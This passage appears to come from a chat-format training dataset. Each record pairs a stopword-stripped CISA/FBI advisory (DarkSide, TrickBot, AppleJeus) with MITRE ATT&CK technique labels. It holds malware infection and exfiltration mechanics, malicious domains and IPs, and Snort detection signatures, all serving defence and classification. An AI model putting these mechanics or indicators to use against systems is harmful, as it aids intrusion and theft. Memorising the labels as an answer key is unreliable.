advisory ongoing information provided considered comprehensive cisa fbi update advisory new information available gaining initial access pipeline companys network darkside actors deployed darkside ransomware companys network response cyberattack company reported theyproactively disconnected certain ot systems ensure thesystemssafety2 time indications threat actor moved laterally ot systems darkside ransomwareasaservice raasthe developers ransomware receive share proceeds cybercriminal actors deploy known affiliatesaccording opensource reporting since august 2020 darkside actors targeting multiple large highrevenue organizations resulting encryption theft sensitive data darkside group publicly stated prefer target organizations afford pay large ransoms instead hospitals schools nonprofits governments34 according opensource reporting darkside actors previously observed gaining initial access phishing exploiting remotely accessible accounts systems virtual desktop infrastructure vdi phishing exploit publicfacing application external remote services56 darkside actors also observed using remote desktop protocol rdp maintain persistence7 gaining access darkside actors deploy darkside ransomware encrypt steal sensitive data data encrypted impact actors threaten publicly release data ransom paid89 darkside ransomware uses salsa20 rsa encryption10 darkside actors primarily use onion router tor command control c2 proxy multihop proxy10900031112 actors also observed using cobalt strike c213 mitigations cisa fbi urge ci owners operators apply following mitigations reduce risk compromise ransomware attacks require multifactor authentication remote access ot networks enable strong spam filters prevent phishing emails reaching end users filter emails containing executable files reaching end users implement user training program simulated attacks spearphishing discourage users visiting malicious websites opening malicious attachments reenforce appropriate user responses spearphishing emails filter network traffic prohibit ingress egress communications known malicious ip addresses prevent users accessing malicious websites implementing url blocklists andor allowlists update software including operating systems applications firmware network assets timely manner consider using centralized patch management system use riskbased assessment strategy determine ot network assets zones participate patch management program limit access resources networks especially restricting rdp assessing risks rdp deemed operationally necessary restrict originating sources require multifactor authentication set antivirusantimalware programs conduct regular scans network assets using uptodate signatures use riskbased asset inventory strategy determine ot network assets identified evaluated presence malware implement unauthorized execution prevention disabling macro scripts microsoft office files transmitted via email consider using office viewer software open microsoft office files transmitted via email instead full microsoft office suite applications implementing application allowlisting allows systems execute programs known permitted security policy implement software restriction policies srps controls prevent programs executing common ransomware locations temporary folders supporting popular internet browsers compressiondecompression programs including appdatalocalappdata folder monitor andor block inbound connections tor exit nodes anonymization services ip addresses ports external connections expected ie vpn gateways mail ports web ports guidance refer joint cybersecurity advisory aa20183a defending malicious cyber activity originating tor deploy signatures detect andor block inbound connection cobalt strike servers post exploitation tools cisa fbi urge ci owners operators apply following mitigations reduce risk severe business functional degradation ci entity fall victim ransomware attack future implement ensure robust network segmentation ot networks limit ability adversaries pivot ot network even network compromised define demilitarized zone eliminates unregulated communication ot networks organize ot assets logical zones taking account criticality consequence operational necessity define acceptable communication conduits zones deploy security controls filter network traffic monitor communications zones prohibit industrial control system ics protocols traversing network identify ot network interdependencies develop workarounds manual controls ensure ics networks isolated connections create risk safe reliable operation ot processes regularly test contingency plans manual controls safety critical functions maintained cyber incidentensure ot network operate necessary capacity even network compromised regularly test manual controls critical functions kept running ics ot networks need taken offline implement regular data backup procedures ot networks backup procedures conducted frequent regular basis data backup procedures also address following best practices ensure backups regularly tested store backups separately backups isolated network connections could enable spread ransomware important backups maintained offline many ransomware variants attempt find encrypt delete accessible backups maintaining current backups offline critical network data encrypted ransomware organization restore systems previous state best practice store backups separate device accessed network external hard drive see software engineering institutes page ransomware maintain regularly updated gold images critical systems event need rebuilt entails maintaining image templates include preconfigured operating system os associated software applications quickly deployed rebuild system virtual machine server retain backup hardware rebuild systems event rebuilding primary system preferred hardware newer older primary system present installation compatibility hurdles rebuilding images store source code executables efficient rebuild system images images install different hardware platforms correctly separate access needed software help cases ensure user process accounts limited account use policies user account control privileged account management organize access rights based principles least privilege separation duties organization impacted ransomware incident cisa fbi recommend following actions isolate infected system remove infected system networks disable computers wireless bluetooth potential networking capabilities ensure shared networked drives disconnected whether wired wireless turn computers devices poweroff segregate ie remove network infected computers poweroff segregate computers devices shared network infected computers fully encrypted ransomware possible collect secure infected potentially infected computers devices central location making sure clearly label computers encrypted poweringoff segregating infected computers computers fully encrypted may allow recovery partially encrypted files specialists see connect new computer internet tips make computer secure reconnect network secure backups ensure backup data offline secure possible scan backup data antivirus program check free malware refer joint cybersecurity advisory aa20245a technical approaches uncovering remediating malicious activity best practices incident response note cisa fbi encourage paying ransom criminal actors paying ransom may embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor may fund illicit activities paying ransom also guarantee victims files recoveredcisa fbi urge report ransomware incidents local fbi field office cisa offers range nocost cyber hygiene services help ci organizations assess identify reduce exposure threats including ransomware requesting services organizations size could find ways reduce risk mitigate attack vectors resources cisa msisac joint ransomware guide cisa ransomware page cisa tip protecting ransomware cisa cisa ransomware onepager technical document cisa insights ransomware outbreak cisa pipeline cybersecurity initiative cisa webinar combating ransomware cisa cybersecurity practices industrial control systems fbi incidents ransomware rise national security agency nsa stop malicious cyber activity connected operational technology department energy oil natural gas subsector cybersecurity capability maturity model transportation security agency pipeline security guidelines national institute standards technology nist framework improving critical infrastructure cybersecurity nist ransomware protection response nist data integrity identifying protecting assets ransomware destructive events nist data integrity detecting responding ransomware destructive events nist data integrity recovering ransomware destructive events nist guide industrial control systems ics security software engineering institute ransomware best practices prevention response nist fact sheet stay prepared contact information victims ransomware report immediately cisa httpsuscertcisagovreport local fbi field office us secret service field office report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch cywatch at855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisadhsgov references1 colonial pipeline media statement pipeline disruption2 ibid3 sonicwall darkside ransomware targets large corporations charges 2m4 varonis return darkside analysis largescale data theft campaign5 bankinfo security fbi darkside ransomware used colonial pipeline attack6 varonis return darkside analysis largescale data theft campaign7 ibid8 sonicwall darkside ransomware targets large corporations charges 2m9 varonis return darkside analysis largescale data theft campaign10 mcafee threat landscape dashboard darkside ransomware11 sonicwall darkside ransomware targets large corporations charges 2m12 varonis return darkside analysis largescale data theft campaign13 mcafee threat landscape dashboard darkside ransomware revisions may 11 2021 initial versionmay 12 2021 added additional resourcesmay 19 2021 added iocsjuly 8 2021 added mar103378021v1 associated iocs product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1133, T1190, T1486, T1566"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary joint cybersecurity advisory uses mitre adversarial tactics techniques common knowledge attck framework version 8 see attck enterprise referenced threat actor tactics techniques cybersecurity infrastructure security agency cisa federal bureau investigation fbi observed continued targeting spearphishing campaigns using trickbot malwarein north america sophisticated group cybercrime actors luring victims via phishing emails traffic infringement phishing scheme download trickbot trickbotfirst identified 2016is trojan developed operated sophisticated group cybercrime actors originally designed banking trojan steal financial data trickbot evolved highly modular multistage malware provides operators full suite tools conduct myriad illegal cyber activities secure trickbot cisa fbi recommend implementing mitigation measures described joint cybersecurity advisory include blocking suspicious internet protocol addresses using antivirus software providing social engineering phishing training employees click pdf version report technical details trickbot advanced trojan malicious actors spread primarily spearphishing campaigns using tailored emails contain malicious attachments links whichif enabledexecute malware phishing spearphishing attachment phishing spearphishing link cisa fbi aware recent attacks use phishing emails claiming contain proof traffic violation steal sensitive information phishing emails contain links redirect website hosted compromised server prompts victim click photo proof traffic violation user execution malicious link user execution malicious file clicking photo victim unknowingly downloads malicious javascript file opened automatically communicates malicious actors command control c2 server download trickbot victims system command scripting interpreter javascript attackers use trickbot drop malware ryuk conti ransomware serve emotet downloader ingress tool transfer1 trickbot uses personinthebrowser attacks steal information login credentials man browser additionally trickbots modules spread malware laterally across network abusing server message block smb protocol trickbot operators toolset capable spanning entirety mitre attck framework actively passively gathering information used support targeting reconnaissance trying manipulate interrupt destroy systems data impact trickbot capable data exfiltration hardcoded c2 server cryptomining host enumeration eg reconnaissance unified extensible firmware interface basic inputoutput systemuefibios firmware exfiltration c2 channel resource hijacking system information discovery2 host enumeration operators deliver trickbot modules containing configuration file specific tasks figure 1 lays trickbots use enterprise techniques figure 1 mitre attck enterprise techniques used trickbot mitre attck techniques according mitre trickbots0266 uses attck techniques listed table 1 table 1 trickbot attck techniques enterprise initial access execution persistence privilege escalation defense evasion credential access discovery lateral movement collection command control exfiltration impact detection signatures cisa developed following snort signature use detecting network activity associated trickbot activity alert tcp any443447 msgtrickbotssltls server x509 cert field contains examplecom hex sid1 rev1 flowestablishedfromserver sslstateserverhello content0bexamplecom fastpatternonly contentglobal security contentit department pcrex09x00xc0xb9x3bx93x72xa3xf6xd2x00xe2x08xffxfbx7bx53x76x3d classtypebadunknown metadataservice sslservice andports alert tcp httpports msgtrickbotanchorhttp uri get contains anchor sid1 rev1 flowestablishedtoserver contentanchor httpuri fastpatternonly contentget nocase httpmethod pcreanchor3waf09u classtypebadunknown priority1 metadataservice http alert tcp sslports msgtrickbotssltls server x509 cert field contains cxx ldefault city odefault company ltd sid1 rev1 flowestablishedfromserver sslstateserverhello content31 0b 30 09 06 03 55 04 06 13 02xx nocase content31 15 30 13 06 03 55 04 07 13 0cdefault city nocase content31 1c 30 1a 06 03 55 04 0a 13 13default company ltd nocase content31 0c 30 0a 06 03 55 04 03 classtypebadunknown referenceurlwwwvirustotalcomguifilee9600404ecc42cf86d38deedef94068db39b7a0fd06b3b8fb2d8a3c7002b650edetection metadataservice ssl alert tcp httpports msgtrickbothttp client header contains boundaryarasfjasu7 sid1 rev1 flowestablishedtoserver contentboundaryarasfjasu70d 0a httpheader contentname22proclist22 httpheader contentreferer contentaccept contentpost httpmethod classtypebadunknown metadataservice http alert tcp httpports msgtrickbothttp client header contains useragent3a 20winhttp loader1 sid1 rev1 flowestablishedtoserver contentuseragent3a 20winhttp loader1 httpheader fastpatternonly contentpng20http1 pcrehostx3ax20d133d13x3ad25mh contentaccept httpheader contentreferer3a 20 httpheader classtypebadunknown metadataservice http alert tcp httpports msgtrickbothttp server header contains server3a 20cowboy sid1 rev1 flowestablishedfromserver content200 httpstatcode contentserver3a 20cowboy0d 0a httpheader fastpattern contentcontentlength3a 2030d 0a httpheader filedata content1 depth3 isdataat1relative classtypebadunknown metadataservice http alert tcp httpports msgtrickbothttp uri post contains c2 exfil sid1 rev1 flowestablishedtoserver contentcontenttype3a 20multipartformdata3b 20boundaryboundary httpheader fastpattern contentuseragent3a 20 httpheader distance0 contentcontentlength3a 20 httpheader distance0 contentpost httpmethod pcreaz3d3af0932d13u pcrehostx3ax20d133d13mh contentreferer3a httpheader classtypebadunknown metadataservice http alert tcp httpports msghttp uri getpost contains 56evcxv trickbot sid1 rev1 flowestablishedtoserver content56evcxv httpuri fastpatternonly classtypebadunknown metadataservice http alert icmp msgtrickboticmpanchoricmp traffic conatins hanc sid1 rev1 itype8 contenthanc offset4 fastpattern classtypebadunknown alert tcp httpports msghttp client header contains post host3a 20onionlink data trickbotprincess ransomeware sid1 rev1 flowestablishedtoserver contentpost nocase httpmethod contenthost3a 20 httpheader contentonionlink nocase httpheader distance0 within47 fastpattern filedata contentdata distance0 within5 classtypebadunknown metadataservice http alert tcp httpports msghttp client header contains host3a 20tpscicom trickbot sid1 rev1 flowestablishedtoserver contenthost3a 20tpscicom httpheader fastpatternonly classtypebadunknown metadataservice http mitigations cisa fbi recommend network defendersin federal state local tribal territorial governments private sectorconsider applying following best practices strengthen security posture organizations systems system owners administrators review configuration changes prior implementation avoid negative impacts provide social engineering phishing training employees consider drafting updating policy addressing suspicious emails specifies users must report suspicious emails security andor departments mark external emails banner denoting email external source assist users detecting spoofed emails implement group policy object firewall rules implement antivirus program formalized patch management process implement filters email gateway block suspicious ip addresses firewall adhere principle least privilege implement domainbased message authentication reporting conformance validation system segment segregate networks functions limit unnecessary lateral communications network hoses segments devices consider using application allowlisting technology assets ensure authorized software executes unauthorized software blocked executing assets ensure technology allows authorized digitally signed scripts run system enforce multifactor authentication enable firewall agency workstations configured deny unsolicited connection requests disable unnecessary services agency workstations servers implement intrusion detection system already used detect c2 activity potentially malicious network activity monitor web traffic restrict user access suspicious risky sites maintain situational awareness latest threats implement appropriate access control lists disable use smbv1 across network require least smbv2 harden systems network propagation modules used trickbot visit mitre attck techniques pages linked table 1 additional mitigation detection strategies see cisas alert technical approaches uncovering remediating malicious activity information addressing potential incidents applying best practice incident response procedures additional information malware incident prevention handling see national institute standards technology special publication 80083 guide malware incident prevention handling desktops laptops resources cisa fact sheet trickbot malware msisac white paper security primer trickbot united kingdom national cyber security centre advisory ryuk ransomware targeting organisations globally cisa msisac joint alert aa20280a emotet malware mitre attck enterprise references1 fireeye blog nasty trick credential theft malware business disruption2 eclypsium blog trickbot offers trickboot persist brick profit revisions march 17 2021 initial versionmarch 24 2021 added mitre attck technique used reconnaissancemay 20 2021 added new mitre attcks updated table 1 product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1005, T1007, T1016, T1018, T1027, T1027.002, T1033, T1036, T1041, T1053.005, T1055.012, T1059.003, T1059.007, T1069, T1071.001, T1082, T1083, T1087.001, T1087.003, T1105, T1106, T1112, T1132.001, T1140, T1204.001, T1204.002, T1482, T1496, T1543.003, T1552.001, T1553.002, T1555, T1555.003, T1562.001, T1566.001, T1566.002, T1570, T1571, T1573.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary advisory uses mitre adversarial tactics techniques common knowledge attck framework see attck enterprise referenced threat actor tactics techniques joint advisory result analytic efforts among federal bureau investigation fbi cybersecurity infrastructure security agency cisa department treasury treasury highlight cyber threat cryptocurrency posed north korea formally known democratic peoples republic korea dprk provide mitigation recommendations working us government partners fbi cisa treasury assess lazarus groupwhich agencies attribute north korean statesponsoredadvanced persistent threat apt actorsis targeting individuals companies including cryptocurrency exchanges financial service companies dissemination cryptocurrency trading applications modified include malware facilitates theft cryptocurrency cyber actors targeted organizations cryptocurrency theft 30 countries past year alone likely actors view modified cryptocurrency trading applications means circumvent international sanctions north koreathe applications enable gain entry companies conduct cryptocurrency transactions steal cryptocurrency victim accounts highlighted fastcash 20 north koreas beagleboyz robbing banks guidance north korean cyber threat north koreas statesponsored cyber actors targeting cryptocurrency exchanges accounts steal launder hundreds millions dollars cryptocurrency123 us government refers malicious cyber activity north korean government hidden cobra information hidden cobra activity visit httpswwwuscertcisagovnorthkorea us government identified malware indicators compromise iocs used north korean government facilitate cryptocurrency thefts cybersecurity community refers activity applejeus report catalogues applejeus malware detail north korea used applejeus malware posing cryptocurrency trading platforms since least 2018 instances malicious applicationseen windows mac operating systemsappears legitimate cryptocurrency trading company thus fooling individuals downloading thirdparty application website seems legitimate addition infecting victims legitimatelooking websites hidden cobra actors also use phishing social networking social engineering techniques lure users downloading malware refer following malware analysis reports mars full technical details applejeus malware associated iocs mar103224631v1 applejeus celas trade pro mar103224632v1 applejeus jmt trading mar103224633v1 applejeus union crypto mar103224634v1 applejeus kupay wallet mar103224635v1 applejeus coingotrade mar103224636v1 applejeus dorusio mar103224637v1 applejeus ants2whale click pdf version report technical details north korean government used multiple versions applejeus since malware initially discovered 2018 section outlines seven versions mars listed provide technical details versions initially hidden cobra actors used websites appeared host legitimate cryptocurrency trading platforms infect victims applejeus however actors also using initial infection vectors phishing social networking social engineering techniques get users download malware targeted nations hidden cobra actors targeted institutions applejeus malware several sectors including energy finance government industry technology telecommunications since january 2020 threat actors targeted sectors following countries argentina australia belgium brazil canada china denmark estonia germany hong kong hungary india ireland israel italy japan luxembourg malta netherlands new zealand poland russia saudi arabia singapore slovenia south korea spain sweden turkey united kingdom ukraine united states figure 1 figure 1 countries targeted applejeus hidden cobra threat actors since 2020 applejeus versions note version numbers used headings document correspond order applejeus campaigns identified open source investigative means versions may may correct order develop deploy applejeus campaigns applejeus version 1 celas trade pro introduction infrastructure august 2018 opensource reporting disclosed information trojanized version legitimate cryptocurrency trading application undisclosed victims computer malicious program known celas trade pro modified version benign qt bitcoin trader application incident led victim company infected remote administration tool rat known fallchill attributed north korea hidden cobra us government fallchill fully functional rat multiple commands adversary issue command control c2 server infected systems via various proxies fallchill typically infects system file dropped hidden cobra malware develop capabilities malware additional hidden cobra malware may present systems compromised fallchill4 research revealed phishing email celas llc company phishing spearphishing link recommended trojanized cryptocurrency trading application victims email provided link celas website celasllccom acquire infrastructure domain victim could download windows macos version trojanized application celasllccom domain resolved following internet protocol ip addresses may 29 2018 january 23 2021 4519963220 10718766103 14524910619 1752932160 185142236213 18518110482 1982518327 2089119746 209996418 celasllccom domain valid sectigo previously known comodo secure sockets layer ssl certificate obtain capabilities digital certificates ssl certificate domain control validated weak security verification level require validation owners identity actual businesss existence celas trade pro application analysis windows program windows version malicious celas trade pro application msi installer msi msi installer installation package comprises software component application programming interface api microsoft uses installation maintenance removal software installer looks legitimate signed valid sectigo certificate purchased user ssl certificate celasllccom obtain capabilities code signing certificates msi installer asks victim administrative privileges run user execution malicious file permission granted threat actor able run program elevated privileges abuse elevation control mechanism msi executes following actions installs celastradeproexe folder cprogram files x86celastradepro installs updaterexe folder cprogram files x86celastradepro runs updaterexe checkupdate parameters celastradeproexe program asks users exchange loads legitimatelooking cryptocurrency trading platformvery similar benign qt bitcoin traderthat exhibits signs malicious activity updaterexe program program icon celastradeproexe run checks checkupdate parameter collects victims host information system owneruser discovery encrypts collected information hardcoded xor encryption sends information c2 website exfiltration c2 channel macos x program macos version malicious application dmg installer disk image format apple commonly uses distribute software internet installer looks legitimate valid digital signature sectigo obtain capabilities digital certificates similar functionality windows version installer executes following actions installs celastradepro folder applicationscelastradeproappcontentsmacos installs updater folder applicationscelastradeproappcontentsmacos executes postinstall script moves comcelastradeproplist folder launchdaemons runs updater checkupdate parameter celastradepro asks users exchange loads legitimatelooking cryptocurrency trading platformvery similar benign qt bitcoin traderthat exhibits signs malicious activity updater checks checkupdate parameter found collects victims host information system owneruser discovery encrypts collected information hardcoded xor key exfiltration sends encrypted information c2 website exfiltration c2 channel process helps adversary obtain persistence victims network postinstall script sequence instructions runs successfully installing application command scripting interpreter unix shell script moves property list plist file comcelastradeproplist installer package launchdaemons folder scheduled taskjob launchd leading makes unlisted finder app default terminal directory listing hide artifacts hidden files directories folder property list plist file launch updater program checkupdate parameter system load root every user launchdaemon run automatically plist file moved postinstall script launches updater program checkupdate parameter runs background create modify system process launch daemon payload cybersecurity company published report detailing programs malicious extras website longer accessible since site c2 server payload confirmed cybersecurity company published report states payload encrypted obfuscated binary obfuscated files information eventually drops fallchill onto machine installs service create modify system process windows service fallchill malware uses rc4 encryption algorithm 16byte key protect communications encrypted channel symmetric cryptography key employed versions also used previous version fallchill56 details applejeus version 1 celas trade pro see mar103224631v1 applejeus version 2 jmt trading introduction infrastructure october 2019 cybersecurity company identified new version applejeus malwarejmt tradingthanks many similarities original applejeus malware malware form cryptocurrency trading application legitimatelooking company called jmt trading marketed distributed website jmttradingorg acquire infrastructure domain website contained download github button linked jmt tradings github page acquire infrastructure web services windows macos x versions jmt trader application available download develop capabilities malware github page also included zip targz files containing source code jmttradingorg domain resolved following ip addresses october 15 2016 january 22 2021 4533279 453323183 45567923 457919196 96126123244 14611261107 18416822140 18416822157 1981872920 19854117197 19854117198 19854117199 19854117200 19858118167 jmttradingorg domain valid sectigo ssl certificate obtain capabilities digital certificates ssl certificate domain control validated weak security verification level require validation owners identity actual businesss existence current ssl certificate issued lets encrypt jmt trading application analysis windows program windows version malicious cryptocurrency application msi installer installer looks legitimate valid digital signature sectigo obtain capabilities digital certificates signature signed code signing certificate purchased user ssl certificate jmttradingorg obtain capabilities code signing certificates msi installer asks victim administrative privileges run user execution malicious file permission granted msi executes following actions installs jmttraderexe folder cprogram files x86jmttrader installs crashreporterexe folder cusersusernameappdataroamingjmttrader runs crashreporterexe maintain parameter jmttraderexe program asks users exchange loads legitimatelooking cryptocurrency trading platformvery similar celastradeproexe benign qt bitcoin traderthat exhibits signs malicious activity program crashreporterexe heavily obfuscated advobfuscation library renamed snowman obfuscated files information run checks maintain parameter collects victims host information system owneruser discovery encrypts collected information hardcoded xor key exfiltration sends encrypted information c2 website exfiltration c2 channel program also creates scheduled system task named jmtcrashreporter runs crashreporterexe maintain parameter users login scheduled taskjob scheduled task macos x program macos version malicious application dmg installer installer looks legitimate similar functionality windows version digital certificate warn user installation installer executes following actions installs jmttrader folder applicationsjmttraderappcontentsmacos installs crashreporter folder applicationsjmttraderappcontentsresources note leading makes unlisted finder app default terminal directory listing executes postinstall script moves comjmttradingplist folder launchdaemons changes file permissions plist runs crashreporter maintain parameter moves crashreporter folder libraryjmttradercrashreporter makes crashreporter executable jmttrader program asks users exchange loads legitimatelooking cryptocurrency trading platformvery similar celastradepro benign qt bitcoin traderthat exhibits signs malicious activity crashreporter program checks maintain parameter obfuscated lack obfuscation makes easier determine programs functionality detail finds maintain parameter collects victims host information system owneruser discovery encrypts collected information hardcoded xor key exfiltration sends encrypted information c2 website exfiltration c2 channel postinstall script similar functionality one used celastradepro additional features command scripting interpreter unix shell moves property list plist file comjmttradingplist installer package launchdaemons folder scheduled taskjob launchd also changes file permissions plist file folder property list plist file launch crashreporter program maintain parameter system load root every user also postinstall script moves crashreporter program new location libraryjmttradercrashreporter makes executable launchdaemon run automatically plist file moved postinstall script launches crashreporter maintain parameter runs background create modify system process launch daemon payload soon cybersecurity company tweeted jmt trader october 11 2019 files github updated clean nonmalicious installers october 13 2019 different cybersecurity company published article detailing macos x jmt trader soon c2 beastgoccom website went offline confirmed sample payload analyze point details applejeus version 2 jmt trading see mar103224632v1 applejeus version 3 union crypto introduction infrastructure december 2019 another version applejeus malware identified twitter cybersecurity company based many similarities original applejeus malware malware form cryptocurrency trading application marketed distributed legitimatelooking company called union crypto website unioncryptovip acquire infrastructure domain although website longer available cybersecurity researcher discovered download link httpswwwunioncryptovipdownloadw6c2dq8by7lumhcmya2v97yen recorded virustotal macos x version unioncryptotrader contrast opensource reporting stated windows version might downloaded via instant messaging service telegram found telegram downloads folder unnamed victim7 unioncryptovip domain resolved following ip addresses june 5 2019 july 15 2020 10416816716 19854117197 19854117198 19854117199 19854117200 domain unioncryptovip valid sectigo ssl certificate obtain capabilities digital certificates ssl certificate domain control validated weak security verification level require validation owners identity actual businesss existence union crypto trader application analysis windows program windows version malicious cryptocurrency application windows executable exe user execution malicious file acts installer extracts temporary msi installer windows program executes following actions extracts unioncryptotradermsi folder cusersusernameappdatalocaltemp82e4b71990f74bd19cf156cd777e0c42 runs unioncryptoupdatermsi installs unioncryptotraderexe folder cprogram filesunioncryptotrader installs unioncryptoupdaterexe folder cusersusernameappdatalocalunioncryptotrader deletes unioncryptoupdatermsi runs unioncryptoupdaterexe program unioncryptotraderexe loads legitimatelooking cryptocurrency arbitrage applicationdefined simultaneous buying selling securities currency commodities different markets derivative forms take advantage differing prices assetwhich exhibits signs malicious activity application similar another cryptocurrency arbitrage application known blackbird bitcoin arbitrage8 program unioncryptoupdaterexe first installs service create modify system process windows service automatically start user logs boot logon autostart execution service installed description stating automatically installs updates union crypto trader launched collects victims host information system owneruser discovery combines information string md5 hashed stored authsignature variable exfiltration sends c2 website exfiltration c2 channel macos x program macos version malicious application dmg installer installer looks legitimate similar functionality windows version digital certificate warn user installation installer executes following actions installs unioncryptotrader folder applicationsunioncryptotraderappcontentsmacos installs unioncryptoupdater folder applicationsunioncryptotraderappcontentsresources note leading makes unlisted finder app default terminal directory listing executes postinstall script moves vipunioncryptoplist folder launchdaemons changes file permissions plist root runs unioncryptoupdater moves unioncryptoupdater folder libraryunioncryptounioncryptoupdater makes unioncryptoupdater executable unioncryptotrader program loads legitimatelooking cryptocurrency arbitrage application exhibits signs malicious activity application similar another cryptocurrency arbitrage application known blackbird bitcoin arbitrage unioncryptoupdater program signed adhoc meaning signed valid codesigning identity launched collects victims host information system owneruser discovery combines information string md5 hashed stored authsignature variable exfiltration sends c2 website exfiltration c2 channel postinstall script similar functionality one used jmt trading command scripting interpreter unix shell moves property list plist file vipunioncryptoplist installer package launchdaemons folder scheduled taskjob launchd also changes file permissions plist file root folder property list plist file launch unioncryptoupdater system load root every user postinstall script moves unioncryptoupdater program new location libraryunioncryptounioncryptoupdater makes executable launchdaemon run automatically plist file moved postinstall script launches unioncryptoupdater runs background create modify system process launch daemon payload payload windows malware windows dynamiclinklibraryunioncryptoupdaterexe immediately download stage 2 malware instead downloads time specified c2 server delay could implemented prevent researchers directly obtaining stage 2 malware macos x malwares payload could downloaded c2 server longer accessible additionally none opensource reporting sample contained copies macos x payload macos x payload likely similar functionality windows stage 2 detailed details applejeus version 3 union crypto see mar103224633v1 commonalities celas trade pro jmt trading union crypto hardcoded values applejeus version hardcoded values used encryption create signature combined time table 1 table 1 applejeus hardcoded values uses union crypto trader celas llc xor values 16 bytes length jmt trader first 16 bytes windows macos x values identical additional bytes time format windows sample structure 16byte value combined time also used union crypto trader create authsignature mentioned fallchill reported final payload celas trade pro fallchill samples use 16byte hardcoded rc4 keys sending data similar 16byte keys applejeus samples opensource cryptocurrency applications three applejeus samples bundled modified copies legitimate cryptocurrency applications used originally designed trade cryptocurrency celas llc jmt trader modified cryptocurrency application qt bitcoin trader union crypto trader modified blackbird bitcoin arbitrage application postinstall scripts property list files launchdaemons macos x samples three applejeus versions contain postinstall scripts similar logic celas llc postinstall script moves plist file new location launches updater checkupdate parameter background jmt trader union crypto trader also perform actions identical functionality additional actions performed postinstall scripts change file permissions plist make new directory library folder move crashreporter unioncryptoupdater newly created folder make executable plist files three applejeus files identical functionality differ files names one default comment removed celas llc plist logic functionality postinstall scripts plist files almost identical launchdaemons created also function launch secondary executable root system load every user applejeus version 4 kupay wallet introduction infrastructure march 13 2020 new version applejeus malware identified malware marketed distributed legitimatelooking company called kupay wallet website kupaywalletcom acquire infrastructure domain domain wwwkupaywalletcom resolved ip address 1042006796 march 20 2020 january 16 2021 crowncloud us llc controlled ip address autonomous system numberasn 8100 located new york ny domain wwwkupaywalletcom valid sectigo ssl certificate obtain capabilities digital certificates ssl certificate domain control validated weak security verification level require validation owners identity actual businesss existence kupay wallet application analysis windows program windows version malicious cryptocurrency application msi installer msi executes following actions installs kupayexe folder cprogram files x86kupay installs kupayupgradeexe folder cusersusernameappdataroamingkupaysupport runs kupayupgradeexe program kupayexe loads legitimatelooking cryptocurrency wallet platform exhibits signs malicious activity similar opensource platform known copay distributed atlantabased company bitpay program kupayupgradeexe first installs service create modify system process windows service automatically start user logs boot logon autostart execution service installed description stating automatic kupay upgrade launched collects victims host information system owneruser discovery combines information strings exfiltration sends c2 website exfiltration c2 channel macos x program macos version malicious application dmg installer installer looks legitimate similar functionality windows version digital certificate warn user installation installer executes following actions installs kupay folder applicationskupayappcontentsmacos installs kupayupgrade folder applicationskupayappcontentsmacos executes postinstall script creates kupaydaemon folder libraryapplication support folder moves kupayupgrade new folder moves comkupaypkgwalletplist folder librarylaunchdaemons runs command launchctl load load plist without restart runs kupayupgrade background kupay likely copy opensource cryptocurrency wallet application loads legitimatelooking wallet program fully functional functionality identical windows kupayexe program kupayupgrade program calls function checkupdate contains logic functionality malware sends post c2 server connection named kupay wallet 901 check update osx application layer protocol web protocols c2 server returns file decoded written victims folder privatetmpkupayupdate permissions set command chmod 700 user read write execute command scripting interpreter stage 2 launched malware kupayupgrade returns sleeping checking c2 server predetermined intervals application layer protocol web protocols postinstall script similar functionality applejeus scripts command scripting interpreter unix shell creates kupaydaemon folder libraryapplication support folder moves kupayupgrade new folder moves property list plist file comkupaypkgwalletplist installer package librarylaunchdaemons folder scheduled taskjob launchd script runs command launchctl load load plist without restart command scripting interpreter since launchdaemon run automatically plist file moved postinstall script launches kupayupgrade runs background create modify system process launch daemon payload windows malwares payload could downloaded since c2 server longer accessible additionally none opensource reporting sample contained copies payload windows payload likely similar functionality macos x stage 2 detailed stage 2 payload macos x malware decoded analyzed stage 2 malware variety functionalities importantly checks c2 connecting c2 send receive payload read write files execute commands via terminal etc details applejeus version 4 kupay wallet see mar103224634v1 applejeus version 5 coingotrade introduction infrastructure early 2020 another version applejeus malware identified time malware marketed distributed legitimatelooking company called coingotrade website coingotradecom acquire infrastructure domain domain coingotradecom resolved ip address 19854114175 february 28 2020 january 23 2021 ip address controlled namecheap inc asn 22612 located atlanta ga ip address asn dorusiocom ants2whalecom domain coingotradecom valid sectigo ssl certificate obtain capabilities digital certificates ssl certificate domain control validated weak security verification level require validation owners identity actual businesss existence coingotrade application analysis windows program windows version malicious application msi installer installer appears legitimate execute following actions installs coingotradeexe folder cprogram files x86coingotrade installs coingotradeupdateexe folder cusersusernameappdataroamingcoingotradesupport runs coingotradeupdateexe coingotradeexe loads legitimatelooking cryptocurrency wallet platform signs malicious activity copy opensource cryptocurrency application coingotradeupdateexe first installs service create modify system process windows service automatically start user logs boot logon autostart execution service installed description stating automatic coingotrade upgrade launched collects victims host information system owneruser discovery combines information strings exfiltration sends c2 website exfiltration c2 channel macos x program macos version malicious application dmg installer installer looks legitimate similar functionality windows version digital certificate warn user installation installer executes following actions installs coingotrade folder applicationscoingotradeappcontentsmacos installs coingotradeupgradedaemon folder applicationscoingotradeappcontentsmacos executes postinstall script creates coingotradeservice folder libraryapplication support folder moves coingotradeupgradedaemon new folder moves comcoingotradepkgproductplist folder librarylaunchdaemons runs coingotradeupgradedaemon background coingotrade program likely copy opensource cryptocurrency wallet application loads legitimatelooking fully functional wallet program coingotradeupgradedaemon program calls function checkupdate contains logic functionality malware sends post c2 server connection named coingotrade 10 check update osx application layer protocol web protocols c2 server returns file decoded written victims folder privatetmpupdatecoingotrade permissions set command chmod 700 user read write execute command scripting interpreter stage 2 launched malware coingotradeupgradedaemon returns sleeping checking c2 server predetermined intervals application layer protocol web protocols postinstall script similar functionality scripts command scripting interpreter unix shell installs coingotrade coingotradeupgradedaemon folder applicationscoingotradeappcontentsmacos moves 